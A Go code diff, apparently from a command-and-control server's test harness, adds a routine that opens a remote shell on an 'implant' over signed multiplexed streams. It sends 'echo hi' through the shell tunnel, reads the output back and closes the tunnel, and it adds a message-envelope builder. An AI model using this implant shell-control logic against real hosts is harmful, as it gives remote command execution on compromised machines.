@@ -33,6 +33,7 @@ import (
 	"net"
 	"os"
 	"path/filepath"
+	"strings"
 	"time"
 
 	"github.com/hashicorp/yamux"
@@ -474,6 +475,44 @@ func handle(conn net.Conn, clientPub ed25519.PublicKey, serverPriv ed25519.Priva
 		v, _ := envelopeFields(resp)
 		fmt.Printf("IMPLANT REPLY ok: type=%d id=%d unknown-type=%d\n", v[2], v[1], v[4])
 	}
+	// Shell: ShellReq(20) -> Shell(21){Pid, TunnelID}, then TunnelData(22) both ways.
+	if _, shBody, err := rpcCall(sess, serverPriv, serverPub, clientPub, 52, 20, protoStr(1, cmdExe), 21); err != nil {
+		log.Printf("shell failed: %v", err)
+	} else {
+		sv, _ := envelopeFields(shBody[3])
+		tunnel := sv[8]
+		fmt.Printf("SHELL ok: pid=%d tunnel=%d\n", sv[3], tunnel)
+		stdin := append(protoStrBytes(1, []byte("echo hi\r\n")), appendUvarint(nil, 8<<3)...)
+		stdin = appendUvarint(stdin, tunnel)
+		env := makeEnvelope(53, 22, stdin)
+		st, err := sess.OpenStream()
+		if err == nil {
+			_ = writeFrame(st, rawSignature(serverPriv, serverPub, env), env)
+		}
+		out := ""
+		for i := 0; i < 4 && !strings.Contains(out, "hi") ; i++ {
+			rs, err := sess.AcceptStream()
+			if err != nil {
+				break
+			}
+			_, envOut, err := readFrame(rs)
+			if err != nil {
+				break
+			}
+			v, b := envelopeFields(envOut)
+			if v[2] == 22 {
+				_, db := envelopeFields(b[3])
+				out += string(db[1])
+			}
+			rs.Close()
+		}
+		fmt.Printf("SHELL OUT: %q\n", out)
+		closeEnv := makeEnvelope(54, 23, appendUvarint(appendUvarint(nil, 8<<3), tunnel))
+		if cs, cerr := sess.OpenStream(); cerr == nil {
+			_ = writeFrame(cs, rawSignature(serverPriv, serverPub, closeEnv), closeEnv)
+		}
+	}
+
 }
 
 
@@ -675,6 +714,23 @@ func firstByte(b []byte) int {
 		return 0
 	}
 	return int(b[0])
+}
+
+
+
+
+
+func makeEnvelope(id, typ uint64, payload []byte) []byte {
+	env := appendUvarint(nil, 1<<3)
+	env = appendUvarint(env, id)
+	env = append(env, 0x10)
+	env = appendUvarint(env, typ)
+	if payload != nil {
+		env = append(env, 0x1a)
+		env = appendUvarint(env, uint64(len(payload)))
+		env = append(env, payload...)
+	}
+	return env
 }
 
 
